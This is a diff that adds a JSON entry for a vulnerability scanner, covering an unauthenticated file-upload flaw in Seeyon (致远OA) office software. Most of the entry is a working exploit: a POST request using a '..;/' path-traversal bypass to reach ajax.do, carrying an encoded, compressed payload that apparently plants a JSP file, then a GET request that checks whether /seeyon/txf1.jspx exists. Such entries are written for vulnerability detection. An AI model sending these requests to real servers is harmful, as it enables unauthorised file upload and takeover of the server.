@@ -1,0 +1,52 @@
+{
+  "product": "致远OA",
+  "vul_name": "致远OA ajaxAction formulaManager文件上传",
+  "type": "文件上传",
+  "vul_id": [],
+  "level": 3,
+  "vul_desc": "致远OA是一套办公协同软件。近日，阿里云应急响应中心监控到致远OA ajaxAction 文件上传漏洞利用代码披露。由于致远OA旧版本某些ajax接口存在未授权访问，攻击者通过构造恶意请求，可在无需登录的情况下上传恶意脚本文件，从而控制服务器。",
+  "version": "致远OA V8.0、V8.0SP1、致远OA V7.1、V7.1SP1",
+  "note": "",
+  "search": {},
+  "protocol": "http",
+  "link": "https://www.cnblogs.com/thelostworld/p/14276957.html",
+  "fix": [
+    "升级系统"
+  ],
+  "exploit": [
+    {
+      "exp": {
+        "method": "post",
+        "follow": false,
+        "path": "/seeyon/autoinstall.do.css/..;/ajax.do?method=ajaxAction&managerName=formulaManager&requestCompress=gzip",
+        "data": "managerMethod=validate&arguments=%1F%C2%8B%08%00%C2%94%3A%C3%BC%5F%00%C3%BFuTKs%C2%A3F%10%3E%27%C2%BF%C2%82%C3%B2Evy%23%23%10k%2B%5B%7B%C2%B0%1E%20%C2%84%C2%84%25%C2%90x%C2%A5r%C2%80%19%04%C2%83f%C2%80%C2%88%C2%B7%5C%C3%BB%C3%9Fw%009%C3%B6V%1C%2E%C3%93%C3%93t%7F%C3%93%C3%BD%C3%B5%C3%A3%C2%AF%C3%97%C3%8119%C2%93%02%C2%BB%C3%BB%26%C3%B5%07%7F2%C2%A3%2F%C3%8C%C2%9BFuI%C2%AB%19%C3%A4%7E%C2%96%0F%C3%9E%C3%95%C2%8B%3A%3D%C3%BBY%C2%86%C2%92%C2%B8%C3%BD%C2%A9%C3%A7g%14%07L%C3%AA%C3%A6%21%C3%B3%C2%9D%C2%B9%19%0E%1F%2A%C3%9Fs%C3%934%7B%C3%88%7C%C2%BFI%C3%A2%C2%87%C2%9Bo%C2%BF3%C3%BD%C3%B7%5B%C3%A4%C2%96%C3%AE%10%25%C3%83%2Du%C3%89%C3%8D3%C3%8A%C3%BD3%C2%93%C2%BE%C3%8B%1C%05%C2%88%C3%BD%C2%8A%C3%B9%C3%84%C3%AC%C2%B6%C3%85%C2%BF%C2%BF%C3%89%C3%AB%C3%A3h%18ei%7Ds%C3%B7%2F%2As%C2%8D%20%0B%7D%C2%8C%C3%9B%10%C2%B6Rz%01%C3%B3%C2%B4%C3%B1%C2%B8%09%2B%2F%C3%83%C3%9C%C2%93%C2%84%C3%8B%0Biu%2Cr%C2%97%1A%0B%C3%A6I%C2%B9%C3%A6%C3%92%10%C2%92E%01x%C2%A3X%13%C2%B5%C3%B4%C3%B4%C2%89r%18%3D%C2%97%07I%C2%8C%1D%5D%0E%201%1A%C3%80%C3%A1%C3%92%C2%8BX%C2%B4%C3%91%C3%87%C2%8D%1C%C2%8D%C2%9F%C3%9CX%C2%AD%5E%C2%88%C2%96%02bDP%C3%82%C2%9C%C2%A3%0B%C2%95mB%2CK8%07%C3%92%C2%A4%C2%81%2D%3E%119%5B%17F%C3%B4%7F%C2%B6FI%C3%96%C3%9D%C2%AD%C2%A0%C2%B0%C3%B9%C2%95%00%C2%96Z%C3%B9%C2%A9%C2%8E%C3%A2%3A%C3%A6%C2%A6P%C2%90%5Cn%C2%A3%C3%BA%1F%C3%80%3F%7Fu%24%23%C3%B2%24%C2%B1%C2%B1%2D%2D%C3%B5%C2%B8%C3%B1%C2%BD%2C%C2%A9%C2%99m%C2%A9%17Y%3C%04%C2%8E%15%C2%B2%C2%8E%29%C2%9C%403%C2%9DS%C2%9B%0B%60%C3%AB%C3%9265%0C%C3%A2%C3%9CP%16%C2%BD%C3%9D%5E%C2%9A%C2%84%14%C2%A3%C2%91%C2%A5M%C3%AA%C3%B3%C3%AA%08PY%C2%A1%C3%B2%0B%3F%C2%AA%C2%A0%C2%B9%C3%8A%5Cs%13%C3%AC%C2%B8%3A%04%C3%BC%26p%C2%9A%10%C3%B9%C2%96%C2%86e1%C2%876%C3%82%C2%8F4%3F%16Z%C2%ABB%5E%C3%B6%7Ek%C2%A2a%C2%87%C3%A0%C3%829%C3%B4%C3%98%C2%8A%24g%C2%9BY%C2%8D%C3%96%C2%A4%C3%86%1E%C2%81%C2%AC%3B%3B%3D%1E%2D%C3%B6%C2%89r%C3%9A%C3%B2%7Er%C3%8C%C3%96n%15R%0E%28%7FW%C3%9Eb5%02%04WP%C2%AA1%C2%9C%0B%7B%C2%B8%5C%C2%A5%1E%01%C2%81%7B%C2%A1%C3%BC%C3%8Ewc%C3%95%C2%94ku%1ET%C3%AA%7CsQ9%119H%7E%04%C2%9Cq%C3%A9j%C2%80%C2%84%0AZ%C2%9Ai%C2%9B%C3%B5%C3%88%C3%91%03%04u9s%C2%9B%C3%93%C3%A3%C2%8E%C3%83%C2%95%C3%9B%C3%A78y%C2%93%C3%97%04b%C2%B8%C3%80%C2%B4%C2%AEZ%C3%A8%11%15%2B%C2%B3%C3%95T36H%C3%99%C3%A7%C3%91%C2%9A%C3%A6%C3%A0Z%C2%BBd%C2%83%C3%AA%C3%82%C2%B1%40p%C3%A0%0C%1A%C2%93%C3%81%C3%AA%C2%9C%21%1C%C3%B8%29%C2%B6%C2%9B%20%C3%B9%C3%B0f%C3%AC%C3%BC%C3%BAf%C2%AA42R%C3%B4N%3Fk%C3%B9%02M%C2%90%C2%AE%C3%9F%C3%B0%C3%B5%C3%93%C2%A3G%0C%C2%9E%C3%96%27%C2%81R%C2%98%C2%82%C2%A6%C2%B3%C3%AB%C3%AB%C3%93%C3%9Auq%C3%BDZ%1Bev%C2%A2z%C2%90%C3%98%C2%8Dp%C3%B2X%C2%87%C3%B2%21f%C2%8A%24%60%C3%98L%2F%C3%90%1C%17%C2%9E%C2%89%2F%C3%B4%C3%9Flg%C2%A8%C2%A2%1Ai%0B%C3%8Aky%C3%B5%2B%C2%BA%C3%BE%C3%A04%C2%BC%C2%8B%0D%C3%A2%C3%90%5EU%C2%96%2B%0C%2C%03%03%7EW8%C2%9C%C3%81%1E%C2%88%C3%B1%C3%B6FAs%0C%1D%3A%C2%B4%1E9%244%C3%8E%C2%94%C3%A6%40%C3%B3%C2%87%2B%2FVY%C3%9B%14%22%C2%9A%1F%C2%8D%C3%83%C2%A8%C2%A1%29f%C2%A0%09%C2%BB%C2%9E%C3%9Eq%C2%93%02J%C3%86%18%C3%92%C3%9Ang%C2%93%C2%AE%27%01%C2%A76%C2%AE5e%3D%C3%89%60%C2%B7QU%C3%B6u%5D%C2%95%1E%C2%BF%C2%BB%7F%1Fr%26%2B%C3%A2%21A%19%18N%C2%9F%C3%B5%C3%85%C3%97%C3%B1%C3%9C%07%09%C2%A4s%0E%C2%AFg%3F%C3%A2%C2%9F%1B%C3%9D%C3%BEw%C2%AA%7B%C2%B7%C3%AB%C2%A5%C3%B7%C3%AD%2F%C2%B7W%C3%80a%7FN%C2%8B%C3%A3%C2%91%02tK%C3%A0%C3%AE%C3%8B%C3%8Da%2F%C3%BE%C3%B1%C3%B4qI%7C%5C3%C3%83%C3%AE%C2%82%C3%A3%2BD%C2%8F%C3%B7%7F%C2%B6%00%27%C2%99O%03%C3%BB%C3%B1%C2%AD%5D%C2%83T%C2%80%C3%BE%C2%91%C3%89r7G%C2%80%C2%A9%C3%AB%C3%BA%C3%B6%C3%AEu%C3%B0%C2%83%C3%AEF%C2%BA%1F%5F%C3%9B3%3F%17%C3%BE%C3%A0%C3%AF%C2%9F%C3%9EEhKV%05%00%00"
+      },
+      "verify": {
+        "path": "",
+        "logic": "and",
+        "check": [
+          {
+            "body": "code"
+          }
+        ]
+      }
+    },
+    {
+      "exp": {
+        "method": "get",
+        "follow": false,
+        "path": "/seeyon/txf1.jspx"
+      },
+      "verify": {
+        "path": "",
+        "logic": "and",
+        "check": [
+          {
+            "status": 500,
+            "body": "NullPointer"
+          }
+        ]
+      }
+    }
+  ]
+}
